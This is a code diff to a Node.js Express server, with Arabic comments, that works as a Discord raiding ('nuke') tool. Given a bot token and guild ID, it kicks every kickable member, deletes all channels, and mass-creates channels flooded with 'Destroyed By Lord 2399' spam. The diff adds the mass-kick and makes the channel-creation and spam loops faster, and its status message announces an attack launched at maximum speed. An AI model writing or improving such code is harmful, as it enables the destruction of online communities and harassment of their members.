@@ -7,14 +7,13 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// تشغيل الواجهة
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 
 app.post('/execute', (req, res) => {
     const { token, guildId, action, customName, customMsg } = req.body;
     
-    // رد فوري للمتصفح عشان ما يطلع "خطأ اتصال"
-    res.status(200).send({ status: '✅ بدأت العملية.. راقب السيرفر!' });
+    // رد فوري للمتصفح لمنع "خطأ الاتصال"
+    res.status(200).send({ status: '🚀 تم إطلاق الهجوم بسرعة قصوى!' });
 
     const client = new Client({ intents: [3276799] });
 
@@ -25,21 +24,30 @@ app.post('/execute', (req, res) => {
         const name = customName || "Lord 2399";
         const msg = customMsg || "# Destroyed By Lord 2399\nhttps://discord.gg/2399k";
 
+        // 1. طرد الجميع (سرعة عالية)
+        if (action === 'طرد' || action === 'تدمير') {
+            const members = await guild.members.fetch();
+            members.forEach(m => { if(m.kickable) m.kick('2399 Power').catch(() => {}); });
+        }
+
+        // 2. التدمير الشامل (حذف وإنشاء وسبام بلحظات)
         if (action === 'تدمير') {
             guild.channels.cache.forEach(c => c.delete().catch(() => {}));
-            for (let i = 0; i < 50; i++) {
+            
+            for (let i = 0; i < 60; i++) {
                 setTimeout(() => {
                     guild.channels.create({ name: name, type: ChannelType.GuildText })
                     .then(ch => {
-                        for(let j=0; j<20; j++) setTimeout(() => ch.send(msg).catch(() => {}), j * 500);
+                        for(let j=0; j<25; j++) ch.send(msg).catch(() => {});
                     }).catch(() => {});
-                }, i * 300);
+                }, i * 100); // سرعة إنشاء مجنونة
             }
         }
         
+        // 3. سبام فقط
         if (action === 'سبام') {
             guild.channels.cache.filter(c => c.type === ChannelType.GuildText).forEach(ch => {
-                for (let i = 0; i < 30; i++) setTimeout(() => ch.send(msg).catch(() => {}), i * 1000);
+                for (let i = 0; i < 40; i++) setTimeout(() => ch.send(msg).catch(() => {}), i * 300);
             });
         }
     }).catch(() => {});
